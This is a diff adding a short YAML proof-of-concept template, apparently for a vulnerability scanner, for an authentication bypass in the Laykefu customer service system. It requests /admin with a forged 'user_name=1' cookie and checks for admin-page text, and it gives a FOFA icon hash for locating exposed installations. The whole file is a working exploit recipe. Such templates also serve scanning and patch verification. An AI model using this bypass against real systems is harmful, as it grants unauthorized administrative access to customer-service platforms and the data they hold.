@@ -1,0 +1,17 @@
+id: poc-yaml-laykefu-customer-service-system-bypass-authentication-login
+info:
+  name: Laykefu客服系统 绕过验证登录漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: Laykefu客服系统
+  fofa: icon_hash="-334624619"
+requests:
+- method: GET
+  path: /admin
+  headers:
+    Cookie: user_name=1
+  expression: status_code == 200 && contains(body,"欢迎您") && contains(body,"客服管理")
+    && contains(body,"laykefu")
+variables: {}
+transport: http
